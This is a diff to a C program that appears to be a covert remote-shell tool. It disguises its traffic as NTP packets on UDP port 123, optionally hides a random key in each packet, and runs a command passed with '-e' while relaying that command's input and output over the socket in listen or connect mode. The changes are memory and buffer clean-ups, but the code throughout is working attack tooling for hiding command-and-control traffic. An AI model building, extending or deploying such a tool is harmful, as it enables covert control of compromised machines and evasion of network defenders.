@@ -36,7 +36,7 @@ int main(int argc, char* argv[]) {
     enum Option opt = 0;
     int gopt = 0;
     #define COMMAND_LENGTH 1024
-    char* command = malloc(sizeof(char) * COMMAND_LENGTH);
+    char* command = NULL;
     int timeout = DEFAULT_TIMEOUT;
     #ifdef OBFUSCATE_ENABLED
         while ((gopt = getopt(argc, argv, "e:loht")) != -1) {
@@ -46,6 +46,7 @@ int main(int argc, char* argv[]) {
         switch (gopt) {
             case 'e':
                 opt |= ShellOption;
+                command = malloc(sizeof(char) * COMMAND_LENGTH);
                 strncpy(command, optarg, COMMAND_LENGTH);
                 break;
             case 't':
@@ -91,14 +92,11 @@ int main(int argc, char* argv[]) {
         }
     }
 
-
-
-
     fd_set rfds;
     struct timeval tv = {timeout, 0};
     Packet* packet = packet_init(NTP_PACKET);
     char buffer[packet->size];
-    char stream[packet->size];
+    //char stream[packet->size];
 
     int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
 
@@ -152,12 +150,12 @@ int main(int argc, char* argv[]) {
             }
             packet->content = NTP_DEFAULT_CONTENT;
             memcpy(&packet->content[packet->content_size - KEY_SIZE], key, KEY_SIZE);
-            packet_stream(packet, stream);
-            sendto(sockfd, stream, packet->size, 0, (struct sockaddr*)&server_addr, sock_struct_length);
+            packet_stream(packet, buffer);
+            sendto(sockfd, buffer, packet->size, 0, (struct sockaddr*)&server_addr, sock_struct_length);
         } else {
             packet->content = NTP_DEFAULT_CONTENT;
-            packet_stream(packet, stream);
-            sendto(sockfd, stream, packet->size, 0, (struct sockaddr*)&server_addr, sock_struct_length);
+            packet_stream(packet, buffer);
+            sendto(sockfd, buffer, packet->size, 0, (struct sockaddr*)&server_addr, sock_struct_length);
         }
     #else
         packet->content = NTP_DEFAULT_CONTENT;
@@ -197,6 +195,7 @@ int main(int argc, char* argv[]) {
         close(PARENT_WRITE_FD);
 
         execve(command, NULL, NULL);
+
     } else {
 
         if (opt & ShellOption) {
@@ -208,6 +207,11 @@ int main(int argc, char* argv[]) {
         }
 
         int max_fd;
+
+        if (command != NULL) {
+            free(command);
+            command = NULL;
+        }
 
         while (1) {
             FD_ZERO(&rfds);
@@ -226,11 +230,11 @@ int main(int argc, char* argv[]) {
                             }
                         }
                     #endif
-                    packet_stream(packet, stream);
+                    packet_stream(packet, buffer);
                     if (opt & ListenOption) {
-                        sendto(sockfd, stream, packet->size, 0, (struct sockaddr*)&client_addr, sock_struct_length);
+                        sendto(sockfd, buffer, packet->size, 0, (struct sockaddr*)&client_addr, sock_struct_length);
                     } else {
-                        sendto(sockfd, stream, packet->size, 0, (struct sockaddr*)&server_addr, sock_struct_length);
+                        sendto(sockfd, buffer, packet->size, 0, (struct sockaddr*)&server_addr, sock_struct_length);
                     }
                     FD_SET(sockfd, &rfds);
                 } else {
@@ -260,46 +264,6 @@ int main(int argc, char* argv[]) {
                     FD_SET(PARENT_READ_FD, &rfds);
                 }
             } else {            
-                /*close(sockfd);
-                sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-
-                if(sockfd < 0){
-                    #ifdef ERROR_ENABLED
-                        fprintf(stderr, "Error: couldn't create socket\n");
-                    #endif
-                    return -1;
-                }
-
-                struct sockaddr_in fresh_server_addr, fresh_client_addr;
-
-                fresh_server_addr.sin_family = AF_INET;
-                fresh_server_addr.sin_port = htons(123);
-                fresh_server_addr.sin_addr.s_addr = server_inet;
-
-                server_addr = fresh_server_addr;
-                client_addr = fresh_client_addr;
-
-                if (opt & ListenOption) {
-                    if(bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0){
-                        #ifdef ERROR_ENABLED
-                            fprintf(stderr, "Error: couldn't bind to port\n");
-                        #endif
-                        return -1;
-                    }
-                } else {
-                    if (opt & ObfuscateOption) {
-                        srand(time(NULL) ^ getpid());
-                        for (int i = 0; i < KEY_SIZE; i++) {
-                            key[i] = (char)rand();
-                        }
-                        packet->content = NTP_DEFAULT_CONTENT;
-                        memcpy(&packet->content[packet->content_size - KEY_SIZE], key, KEY_SIZE);
-                        sendto(sockfd, packet_stream(packet), packet->size, 0, (struct sockaddr*)&server_addr, sock_struct_length);
-                    } else {
-                        packet->content = NTP_DEFAULT_CONTENT;
-                        sendto(sockfd, packet_stream(packet), packet->size, 0, (struct sockaddr*)&server_addr, sock_struct_length);
-                    }
-                }*/
                 tv = (struct timeval) {timeout, 0};
             }
         }   
